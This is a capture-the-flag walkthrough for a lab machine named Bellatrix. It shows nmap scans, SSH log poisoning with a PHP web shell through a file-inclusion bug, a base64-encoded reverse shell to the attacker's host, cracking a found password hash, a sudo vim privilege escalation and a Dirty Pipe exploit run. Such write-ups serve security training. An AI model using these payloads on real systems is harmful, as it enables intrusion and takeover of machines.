# Bellatrix
## User flag

As always let's see the open ports

```shell
 nmap -n -p- -Pn -sS --min-rate 5000 -oN allports 192.168.1.40
 PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Now let's do a in depth scan of those ports

```shell
nmap -sCV -p80,22 -oN targeted 192.168.1.40
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4b:ce:c7:5a:9c:1f:8b:cd:47:03:08:69:85:c2:91:49 (RSA)
|   256 a1:2a:a8:15:99:04:cc:2a:1e:e3:50:00:f3:55:c2:cc (ECDSA)
|_  256 2c:d3:ec:6f:4f:5b:4a:e0:ea:0a:c3:0d:2f:cb:78:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: AvadaKedavra
|_http-server-header: Apache/2.4.46 (Ubuntu)
```

Nothing meaningful so far let's see the web. Now we have two huge hints we have a domain at the end of the text "ikilledsiriusblack.php" and a possible LFI in that page by looking at the php code on the left corner.

Thats right by going to the php domain and adding ?file we can read files from the system. The obvious step now is to get RCE with log poisoning so I started looking for apache logs everywhere but I couldn't find any. However I managed to found ssh logs at /var/log/auth.log so I injected php code by connecting as a php command like this

```shell
ssh '<?php system($_GET[c]); ?>'@192.168.1.40
```

Just enter whatever password you wish because the idea of this is injecting code on the log. Now if we also call the attribute c we can execute commands ex: ` http://192.168.1.40/ikilledsiriusblack.php?file=/var/log/auth.log&c=ls ` by pressing crtl+u we can see the response more clearly (at least in chrome). Ok let's just inject the base64 shell then in my case `echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEzLzc3NzcgMD4mMQo=" | base64 -d | bash`

```shell
 nc -lvp 7777
Connection from 192.168.1.40:49022
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@bellatrix:/var/www/html$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~/htb/bellatrix/scan]$ stty raw -echo;fg
[1]  + continued  nc -lvp 7777

www-data@bellatrix:/var/www/html$ stty rows 30 columns 132
www-data@bellatrix:/var/www/html$
```

We have a directory called secrets in base64 and inside we have the password hash of the user lestrange and a dictionary.

```shell
secretswww-data@bellatrix:/var/www/html$ cd c2VjcmV0cw\=\=/
www-data@bellatrix:/var/www/html/c2VjcmV0cw==$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Nov 28  2020 .
drwxr-xr-x 3 root root 4096 Nov 28  2020 ..
-rw-r--r-- 1 root root 1237 Nov 28  2020 .secret.dic
-rw-r--r-- 1 root root  117 Nov 28  2020 Swordofgryffindor
www-data@bellatrix:/var/www/html/c2VjcmV0cw==$ cat Swordofgryffindor
lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0
```
once cracked the password is

```shell
hashcat -m 1800 hash dict --show
$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0:ihateharrypotter
```

Once logged as the new user we have a restricted shell called rbash but we can easily break out like this

```shell
lestrange@bellatrix:/var/www/html/c2VjcmV0cw==$ cd
rbash: cd: restringido
lestrange@bellatrix:/var/www/html/c2VjcmV0cw==$ bash
lestrange@bellatrix:/var/www/html/c2VjcmV0cw==$ cd
lestrange@bellatrix:~$
```

Next step is clear when executing sudo -l

```shell
lestrange@bellatrix:/var/www/html$ sudo -l
Coincidiendo entradas por defecto para lestrange en bellatrix:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario lestrange puede ejecutar los siguientes comandos en bellatrix:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

let's execute a shell with vim as bellatrix

```shell
sudo -u bellatrix vim -c ':!/bin/sh'
:!/bin/sh
$ bash
bellatrix@bellatrix:/var/www/html$
```
 When executing the command a weird pseudo shell spawns but by typing bash we can once again break out. Now we can get the user flag

```shell
bellatrix@bellatrix:/var/www/html$ cd
bellatrix@bellatrix:~$ cat flag.txt
```

## Root flag

For a better workflow I created an ssh key pair and added my public key to the authorized keys however this is optional. After some time lost I decided to execute linpeas and I realize that the user is part of the lxd group however lxc wasn't installed. So my next idea is to try the dirty pipe exploit, I used this [repo](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) modified the compile.sh to add --static to both lines and tried the exploits, exploit-1 didn't work but exploit-2 did.


```shell
bellatrix@bellatrix:/dev/shm$ ./exploit-2 /usr/bin/mount
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
# cat /root/root.txt
 ____       _ _       _        _
 |  _ \     | | |     | |      (_)
 | |_) | ___| | | __ _| |_ _ __ ___  __
 |  _ < / _ \ | |/ _` | __| '__| \ \/ /
 | |_) |  __/ | | (_| | |_| |  | |>  <
 |____/ \___|_|_|\__,_|\__|_|  |_/_/\_\




  _               _
 | |             | |
 | |     ___  ___| |_ _ __ __ _ _ __   __ _  ___
 | |    / _ \/ __| __| '__/ _` | '_ \ / _` |/ _ \
 | |___|  __/\__ \ |_| | | (_| | | | | (_| |  __/
 |______\___||___/\__|_|  \__,_|_| |_|\__, |\___|
                                       __/ |
                                      |___/


```

For me this machine is very easy as the Dobby one it only adds more steps but none are difficult to achieve, however I reckon that this machine is really useful to practice a lot of skills.

(EDIT): Hey the last step wasn't needed for root flag, as the machine was in Spanish I though that when I executed sudo -l it meant you could execute this command as bellatrix but bellatrix is also the name of the machine. So you can just go from lestrange to root without dirty pipe. And that's why sometimes you have to read carefully! Anyway great machine over all.
